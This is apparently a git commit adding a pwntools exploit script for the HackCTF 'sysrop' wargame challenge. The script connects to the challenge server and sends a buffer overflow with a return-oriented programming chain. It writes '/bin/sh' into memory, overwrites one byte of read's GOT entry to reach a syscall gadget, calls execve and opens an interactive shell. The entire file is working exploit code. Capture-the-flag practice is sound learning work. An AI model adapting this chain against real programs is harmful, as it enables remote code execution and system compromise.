9074e05247d82cb5d454f4cca5e339919b082bfb
snwox <40853955+snwox@users.noreply.github.com>
2020-09-03 17:55:37 -0700

    hackctf add

---
+++ Wargame/Pwnable/HackCTF/_sysrop/ex.py
@@ -0,0 +1,42 @@
+from pwn import *
+r=remote("ctf.j0n9hyun.xyz",3024)
+#r=process("./sysrop")
+lib=ELF("./libc.so.6")
+b=ELF("./sysrop")
+context.log_level='debug'
+
+read=b.plt['read']
+read_got=b.got['read']
+ppppr=0x00000000004005ea #: pop rax ; pop rdx ; pop rdi ; pop rsi ; ret
+pppr=0x4005eb # rdx rdi rsi ret
+bss=0x601060
+
+pay='a'*0x10
+pay+=p64(bss)
+pay+=p64(pppr)
+pay+=p64(7)
+pay+=p64(0)
+pay+=p64(bss)
+pay+=p64(read) # got /bin/sh
+pay+=p64(0x4005f2)
+
+r.send(pay)
+r.send('/bin/sh')
+
+pay2='a'*0x10
+pay2+='x'*0x8
+pay2+=p64(pppr)
+pay2+=p64(1)
+pay2+=p64(0)
+pay2+=p64(read_got)
+pay2+=p64(read) #1 byte got overwrite
+pay2+=p64(ppppr)
+pay2+=p64(59)
+pay2+=p64(0)
+pay2+=p64(bss)
+pay2+=p64(0)
+pay2+=p64(read)
+
+r.sendline(pay2)
+r.send('\x5e')
+r.interactive()
